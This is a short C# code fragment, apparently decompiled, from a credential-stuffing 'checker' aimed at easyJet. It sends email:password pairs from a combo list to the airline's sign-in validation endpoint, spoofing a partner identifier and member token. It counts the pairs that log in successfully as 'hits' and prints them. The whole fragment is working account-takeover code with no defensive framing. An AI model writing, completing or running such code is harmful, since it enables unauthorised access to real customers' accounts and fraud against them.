        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str = "{\"partnerIdentifier\":\"cartrawler\",\"email\":\"" + s[0] + "\",\"userPassword\":\"" + s[1] + "\",\"partnerMemberToken\":\"123456789\"}";
              if (httpRequest.Post("https://brand.easyjet.com/en/ValidateSignIn", str, "application/x-www-form-urlencoded").ToString().Contains("Success\": true"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - EASYJET] " + s[0] + ":" + s[1], Color.Green);
